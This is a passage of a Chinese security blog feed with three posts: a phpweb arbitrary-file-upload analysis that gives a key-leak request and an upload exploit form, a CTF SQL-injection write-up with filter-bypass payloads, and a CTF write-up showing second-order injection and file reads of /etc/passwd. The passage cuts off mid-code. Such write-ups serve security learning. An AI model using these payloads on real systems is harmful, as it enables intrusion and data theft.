class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//检查目录名</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>($path!=<span class="string">""</span>)&#123;</div><div class="line">$ToPath=<span class="string">"../"</span>.$path;</div><div class="line">$Tofile=$ToPath.<span class="string">"/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line"><span class="keyword">if</span>(!is_dir($ToPath))&#123;</div><div class="line">@mkdir($ToPath,<span class="number">0777</span>);</div><div class="line">&#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">$ToPath=<span class="string">"../update/"</span>;</div><div class="line">$Tofile=<span class="string">"../update/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!is_writable($ToPath))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR:"</span>.$ToPath.<span class="string">" 目录不可写，请设置目录属性为可写"</span>;</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" ERROR: "</span>.$ToPath.<span class="string">" 目录不可写，请设置目录属性为可写\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(file_exists($Tofile) &amp;&amp; !is_writable($Tofile))&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"ERROR:"</span>.$Tofile.<span class="string">" 文件不能覆盖，请设置文件属性为可写"</span>;</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" ERROR: "</span>.$Tofile.<span class="string">" 文件不能覆盖，请设置文件属性为可写\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//复制文件</span></div><div class="line">copy($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],$Tofile);</div><div class="line"></div><div class="line"><span class="keyword">switch</span>($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>])&#123;</div><div class="line"></div><div class="line"><span class="keyword">case</span> <span class="string">"application/octet-stream"</span>:</div><div class="line">@chmod($Tofile,<span class="number">0755</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">default</span>:</div><div class="line">@chmod($Tofile,<span class="number">0666</span>);</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"文件上传成功: "</span> .substr($Tofile,<span class="number">3</span>);</div><div class="line">@write_log(<span class="string">"app.log"</span>,date(<span class="string">"Y-m-d H:i:s"</span>,time()).<span class="string">" 文件上传成功: "</span>.substr($Tofile,<span class="number">3</span>).<span class="string">"\n"</span>,FILE_APPEND);</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以看到这里存在任意文件上传，但是前提是需要通过密钥校验</p><p><img src="http://pic.c1imber.top/blog/20200110/axlunRoNQX9I.png?imageslim" alt="mark"></p><p>这里的<code>$m</code>和<code>$t</code>都是可控的，如果可以在代码当中找到<code>$k</code>的值，就可以通过密钥校验</p><p>通过全局搜索<code>md5(strrev($dbUser.$dbPass))</code>可以在/base/post.php找到该值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">$act = $_POST[<span class="string">'act'</span>];</div><div class="line"></div><div class="line"><span class="keyword">switch</span>($act)&#123;</div><div class="line">...</div><div class="line">...</div><div class="line"><span class="keyword">case</span> <span class="string">"appcode"</span> :</div><div class="line">$pluslable=$_POST[<span class="string">'pluslable'</span>];</div><div class="line">$apptype=$_POST[<span class="string">'apptype'</span>];</div><div class="line">$coltype=$_POST[<span class="string">'coltype'</span>];</div><div class="line">$tempid=$_POST[<span class="string">'tempid'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>($apptype==<span class="string">"plus"</span>)&#123;</div><div class="line">$msql-&gt;query(<span class="string">"select id from &#123;P&#125;_base_plusdefault where `pluslable`='$pluslable'"</span>);</div><div class="line"><span class="keyword">if</span>($msql-&gt;next_record())&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"1000"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">$msql-&gt;query(<span class="string">"select id from &#123;P&#125;_base_coltype where `coltype`='$coltype'"</span>);</div><div class="line"><span class="keyword">if</span>($msql-&gt;next_record())&#123;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"2000"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($apptype==<span class="string">"border"</span>)&#123;</div><div class="line">$msql-&gt;query(<span class="string">"select id from &#123;P&#125;_base_border where `tempid`='$tempid'"</span>);</div><div class="line"><span class="keyword">if</span>($msql-&gt;next_record())&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"1000"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$code=<span class="string">"k="</span>.md5(strrev($dbUser.$dbPass)).<span class="string">"&amp;t="</span>.time();</div><div class="line"><span class="keyword">echo</span> $code;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>step1:获取<code>$k</code>:<code>md5(strrev($dbUser.$dbPass))</code></p><p><a href="http://192.168.157.130/phpweb/3151/base/post.php" target="_blank" rel="external">http://192.168.157.130/phpweb/3151/base/post.php</a><br>post：act=appcode<br><img src="http://pic.c1imber.top/blog/20200110/Wr17MV9wp8aG.png?imageslim" alt="mark"></p><p>step2:通过<code>$k</code>构造<code>$m</code>和<code>md5($k.$t)</code>,使<code>$m===$md5</code><br><img src="http://pic.c1imber.top/blog/20200110/U5wkxGxKhYDL.png?imageslim" alt="mark"></p><p>step3:构造上传exp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.157.130/phpweb/3151/base/appplus.php"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span>Upload a new file:<span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"act"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"m"</span> <span class="attr">value</span>=<span class="string">"26478db11a74b3c8675f463fee30cba7"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"t"</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"r_size"</span> <span class="attr">value</span>=<span class="string">"18"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">size</span>=<span class="string">"18"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure><p>本地构造好上传页面直接上传即可</p><p>注意这里<code>$_POST[&#39;r_size&#39;]</code>要和<code>$_FILES[&#39;file&#39;][&#39;size&#39;]</code>大小相等（字节）</p><p><img src="http://pic.c1imber.top/blog/20200110/ojRmuDjY4Qsz.png?imageslim" alt="mark"></p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/7053" title="phpweb前台任意文件上传" target="_blank" rel="external">https://xz.aliyun.com/t/7053</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;phpweb前台任意文件上传&quot;&gt;&lt;a href=&quot;#phpweb前台任意文件上传&quot; class=&quot;headerlink&quot; title=&quot;phpweb前台任意文件上传&quot;&gt;&lt;/a&gt;phpweb前台任意文件上传&lt;/h1&gt;&lt;h3 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏
      
    
    </summary>
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ctf记录-记一次有趣的注入</title>
    <link href="https://c1aysec.github.io/2019/11/03/ctf%E8%AE%B0%E5%BD%95-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
    <id>https://c1aysec.github.io/2019/11/03/ctf记录-记一次有趣的注入/</id>
    <published>2019-11-03T02:29:00.000Z</published>
    <updated>2019-11-06T17:11:00.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctf记录-记一次有趣的注入绕过"><a href="#ctf记录-记一次有趣的注入绕过" class="headerlink" title="ctf记录-记一次有趣的注入绕过"></a>ctf记录-记一次有趣的注入绕过</h1><p>正常页面：<br>xxx/article.php?id=2</p><p>当<code>id=2&#39;</code>时返回404(页面不正常)，但是没有sql报错信息<br><img src="http://pic.c1imber.top/blog/20191103/3bsc8Vsv4JIk.png?imageslim" alt="mark"><br>当<code>id=2&quot;</code>时返回正常页面<br><img src="http://pic.c1imber.top/blog/20191103/pid239dEOaan.png?imageslim" alt="mark"><br>所以有可能是单引号包裹的字符型无报错回显注入</p><p>当<code>id=2&#39;--</code>时– 被过滤，<code>id=2&#39;%23</code>页面正常显示,基本确定了存在注入<br><img src="http://pic.c1imber.top/blog/20191103/VQCYSJ7NGEI7.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/NBypRnQjWQ31.png?imageslim" alt="mark"></p><p>该注入存在过滤，通过简单测试，发现大致过滤了order、information_schema、and、or、逗号等字符，并且对union select进行了过滤，但是union和select单独出现并没有过滤</p><p>另外该注入无sql报错回显，只能使用union联合查询和盲注，由于前者在页面有回显，所以这里优先选择前者</p><p>选择union注入的话，总结出需要突破的几个点：</p><pre><code>1、需要突破对union select的过滤，另外order被过滤，所以不能通过order by判断列数2、注入不能使用逗号3、不能使用information_schema</code></pre><p>接下来，对这些限制进行突破，总之，过滤了什么，绕什么就行了~</p><p>突破1：</p><p>mysql当中<code>/**/</code>可以代替空格，可以使用<code>union/**/select</code>绕过对<code>union select</code>的过滤</p><p>order被过滤，不能使用order by判断列数，使用以下方式判断列数</p><pre><code>id=2&apos; union/**/select 1id=2&apos; union/**/select 1,2...    </code></pre><p>但是这里使用了逗号，被拦截<br><img src="http://pic.c1imber.top/blog/20191103/n0Ssb5lx5C6f.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/hlj42riH3JhY.png?imageslim" alt="mark"></p><p>突破2：</p><p>不能使用逗号，可以使用子查询绕过</p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/FAgbn0kGvekX.png?imageslim" alt="mark"><br>回显位在2和4，尝试检查查询一些信息，查询成功</p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select user())d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/quddeGfhqJ6i.png?imageslim" alt="mark"></p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select version())d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/vOUMiM47pRt8.png?imageslim" alt="mark"></p><pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select database())d%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/LLR8lDCOKcbU.png?imageslim" alt="mark"><br>但是在通过<code>information_schema</code>获取表名和列名时，被拦截</p><p>突破3：</p><p>关于注入不能使用<code>information_schema</code>,记得之前s1ye师傅有提到过绕过的方法，那时没有怎么研究，又去请教了一番s1ye师傅，得到解答~</p><p>当不能使用<code>information_schema</code>时，可以使用<code>select group_concat(distinct table_name)from mysql.innodb_index_stats</code>获取到表名，很强（看来有必要仔细阅读一下mysql的官方手册了）</p><p>获取表名：<br><code>id=112&#39; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select group_concat(distinct table_name)from mysql.innodb_index_stats)d%23</code><br><img src="http://pic.c1imber.top/blog/20191103/H4AwS6Lzcqdy.png?imageslim" alt="mark"></p><p>接下来就是关于无列名注入的问题了，继续使用子查询就可以解决，获取flag~</p><pre><code>id=112&apos; union/**/select * from ((select 1)a join (select 2)b join (select 3)c join (select group_concat(`3`) from (select * from ((select 1)a join (select 2)b join (select 3)c) union/**/select * from fl111aa44a99g)x)d)%23</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/mvbTH4konJGF.png?imageslim" alt="mark"></p><p>拖延症真的很可怕</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ctf记录-记一次有趣的注入绕过&quot;&gt;&lt;a href=&quot;#ctf记录-记一次有趣的注入绕过&quot; class=&quot;headerlink&quot; title=&quot;ctf记录-记一次有趣的注入绕过&quot;&gt;&lt;/a&gt;ctf记录-记一次有趣的注入绕过&lt;/h1&gt;&lt;p&gt;正常页面：&lt;br&gt;xxx/a
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019极客巅峰ctf记录</title>
    <link href="https://c1aysec.github.io/2019/10/20/2019%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0ctf%E8%AE%B0%E5%BD%95/"/>
    <id>https://c1aysec.github.io/2019/10/20/2019极客巅峰ctf记录/</id>
    <published>2019-10-19T16:50:00.000Z</published>
    <updated>2019-11-06T17:03:35.474Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019极客巅峰ctf记录"><a href="#2019极客巅峰ctf记录" class="headerlink" title="2019极客巅峰ctf记录"></a>2019极客巅峰ctf记录</h1><p><strong>周六抽时间做了2019极客巅峰的ctf,发现自己是真的菜，需要找个地方沉淀一下，所以将做出的题记录记录在博客</strong></p><h3 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h3><p><img src="http://pic.c1imber.top/blog/20191020/zY6KbGAP9u64.png?imageslim" alt="mark"></p><p><strong>提示admin才能看到flag1</strong><br><img src="http://pic.c1imber.top/blog/20191020/T16DhJOQLBjb.png?imageslim" alt="mark"></p><p><strong>发现注册处用户名参数存在二次注入，有过滤，使用`name=admin’/</strong>/and/<strong>/‘3`绕过</strong><br><img src="http://pic.c1imber.top/blog/20191020/2mtrs07TKjak.png?imageslim" alt="mark"><br><strong>注册成功，用户名：assssssssss@qq.com，密码：123456’,登录成功，成功获取到flag</strong><br><img src="http://pic.c1imber.top/blog/20191020/xlGk67iKvFUf.png?imageslim" alt="mark"></p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p><strong>这道题线上没做出来，比赛结束后研究了一波，:(</strong><br><img src="http://pic.c1imber.top/blog/20191019/VjLvacUQM2uY.png?imageslim" alt="mark"></p><p><strong>打开题目,首页有三个模块，分别为</strong></p><p><strong>查看文件：file.php?file=</strong><br><img src="http://pic.c1imber.top/blog/20191019/1aLGVXSWXCvO.png?imageslim" alt="mark"></p><p><strong>上传文件：upload_file.php</strong><br><img src="http://pic.c1imber.top/blog/20191019/o2XlzFejE61c.png?imageslim" alt="mark"></p><p><strong>下载文件：download.php</strong><br><img src="http://pic.c1imber.top/blog/20191019/KaNmoB7m2Jq9.png?imageslim" alt="mark"></p><p><strong>下载文件页面泄露了部分的源代码，代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>;</div><div class="line">                $dir =<span class="string">"./"</span>;</div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>;</div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );</div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );</div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>这里存在文件下载漏洞，但是存在过滤，暂时无法绕过</strong></p><p><strong>查看页面源代码发现hint:提示flag文件的位置位于<code>/flag</code></strong><br><img src="http://pic.c1imber.top/blog/20191019/10OYU1mrceLm.png?imageslim" alt="mark"></p><p><strong>回过头发现查看文件模块存在任意文件读取:<code>/file.php?file=/etc/passwd</code></strong><br><img src="http://pic.c1imber.top/blog/20191019/4TclaUEmLrtg.png?imageslim" alt="mark"></p><p><strong>尝试直接读取flag文件。失败：</strong><br><img src="http://pic.c1imber.top/blog/20191019/T9xIQW4ABzPz.png?imageslim" alt="mark"></p><p><strong>尝试读取download.php:<code>/file.php?file=download.php</code>读取失败</strong><br><img src="http://pic.c1imber.top/blog/20191019/Q2oFRSeddAD1.png?imageslim" alt="mark"><br><strong>修改为绝对路径<code>/file.php?file=/var/www/html/download.php</code>,读取成功</strong><br><img src="http://pic.c1imber.top/blog/20191019/4wezOnEoEe8a.png?imageslim" alt="mark"><br><strong>完整源码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">&lt;pre&gt;    </div><div class="line"></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>;</div><div class="line">                $dir =<span class="string">"./"</span>;</div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>;</div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );</div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );</div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&lt;/pre&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>; <span class="comment">//获取文件名称</span></div><div class="line">                $dir =<span class="string">"./"</span>;  <span class="comment">//相对于网站根目录的下载目录路径</span></div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>; <span class="comment">//当前域名</span></div><div class="line">                <span class="comment">//判断如果文件存在,则跳转到下载路径</span></div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );    </div><div class="line"></div><div class="line">                    <span class="comment">//告诉浏览器这是一个文件流格式的文件</span></div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    <span class="comment">//请求范围的度量单位</span></div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    <span class="comment">//Content-Length是指定包含于请求或响应中数据的字节长度</span></div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    <span class="comment">//用来告诉浏览器，文件是可以当做附件被下载，下载后的文件名称为$file_name该变量的值。</span></div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );    </div><div class="line"></div><div class="line">                    <span class="comment">//读取文件内容并直接输出到浏览器</span></div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;    </div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//return safe name</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</div><div class="line">    $string = str_replace(<span class="string">'%20'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'%27'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span 